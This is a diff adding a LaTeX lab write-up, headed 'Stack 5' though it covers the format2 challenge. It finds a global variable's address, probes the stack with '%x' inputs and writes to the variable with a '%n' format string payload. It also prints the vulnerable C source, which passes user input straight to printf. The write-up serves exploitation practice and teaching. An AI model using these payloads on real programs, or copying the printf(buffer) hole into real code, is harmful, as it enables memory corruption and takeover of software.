@@ -1,0 +1,64 @@
+
+\begin{center}\begin{LARGE} Stack 5\end{LARGE}\end{center}
+ 
+\subsection*{Problem}
+
+\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {bash}
+objdump -t format2 | grep target
+>>>080496e4 g     O .bss   00000004              target
+\end{minted}
+
+Again, we find the location of our target. We know from the source code that the
+program now takes in an input into the buffer and prints it. We so the same
+as before by first printing a sequence of character and try to identify where
+the pointer resides on the stack. We then make use of string format to do the attack.
+
+\subsection*{Idea and Attack process}
+
+We first try to locate our variable first. This time we quickly find the target,
+that is 2 positions below our injected string.
+
+\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {c}
+python -c "print 'AAAA' + '%x.'*10" | ./format2
+>>>AAAA200.b7fd8420.bffffb14.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
+\end{minted}
+
+We now want to write to the target value. We try different values to write to the
+address and we eventually find that the combination below leads to the target
+variable being modified.
+
+\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {c}
+ python -c "print '\xe4\x96\x04\x08' + '%x.'*2 + '%47d' +'%n'" | ./format2
+200.b7fd8420.                                    -1073743084
+you have modified the target :)
+\end{minted}
+
+\subsection*{Source code}
+
+\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {c}
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int target;
+
+void vuln()
+{
+    char buffer[512];
+
+    fgets(buffer, sizeof(buffer), stdin);
+    printf(buffer);
+    
+    if(target == 64) {
+        printf("you have modified the target :)\n");
+    } else {
+        printf("target is %d :(\n", target);
+    }
+}
+
+int main(int argc, char **argv)
+{
+    vuln();
+}
+\end{minted}
